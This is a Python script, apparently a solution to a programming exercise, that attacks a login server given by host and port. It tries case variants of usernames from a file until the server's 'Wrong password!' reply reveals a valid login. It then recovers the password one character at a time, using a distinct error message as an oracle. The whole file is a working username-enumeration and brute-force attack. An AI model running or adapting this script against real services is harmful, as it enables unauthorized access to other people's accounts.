import itertools, string, socket, sys, json
from string import ascii_letters, digits

"""
This function generates user logins from logins.txt but giving every perumutation of upper and lower case variants.
You may want to use the absolute path for your file with the context manager

"""

def user_generator():
    with open('logins.txt', 'r') as file2:
        login = file2.readlines()
        login = (user.strip() for user in login)
    key2 = login

    for _ in range(1000):
        logins = list(dict.fromkeys((itertools.chain(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in next(key2))))))))
        for users in logins:
            yield users


"""
This function simply generates a JSON object from a dictionary from the return of user_generator and from ascii_letters + digits.
This is then passed through the socket to determine the correct login and password.


"""

def json_join(login, password):

    jsondic = {'login': login, 'password': password}
    return json.dumps(jsondic)


logins = user_generator()
correct_login = None
correct_password = False
password = ''

with socket.socket() as client_socket:
    args = sys.argv
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)

#This finds the correct login from the server message returned from the machine
    for login in logins:
        client_socket.send(json_join(login, ' ').encode())
        response = json.loads(client_socket.recv(1024).decode('utf-8'))
        if response['result'] == "Wrong password!":
            correct_login = login
            break
#Guesses the password one letter at a time and appends the guess if the first n letters are correct based on whether there is an exception caught
    while not correct_password:

        for item in ascii_letters + digits:
            test = password + item
            dic = json_join(correct_login, test)
            client_socket.send(dic.encode())
            response = json.loads(client_socket.recv(1024).decode('utf-8'))
            message = response['result']
            if message == "Exception happened during login":
                password = test
                break
            if message == "Connection success!":
                correct_password = test
                break
print(json_join(correct_login, correct_password))